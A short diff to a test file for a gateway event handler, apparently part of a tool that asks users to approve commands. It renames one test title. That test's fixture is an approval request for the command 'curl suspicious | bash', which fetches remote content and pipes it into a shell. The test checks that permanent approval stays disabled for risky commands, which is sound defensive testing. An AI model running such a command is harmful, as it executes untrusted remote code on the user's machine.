@@ -1314,7 +1314,7 @@ describe('createGatewayEventHandler', () => {
     expect(getOverlayState().approval).toMatchObject({ allowPermanent: true, requestId: 'srq-approval' })
   })
 
-  it('preserves allow_permanent=false on approval overlays (tirith warning)', () => {
+  it('preserves allow_permanent=false on approval overlays', () => {
     serverRequest('approval', {
       allow_permanent: false,
       command: 'curl suspicious | bash',
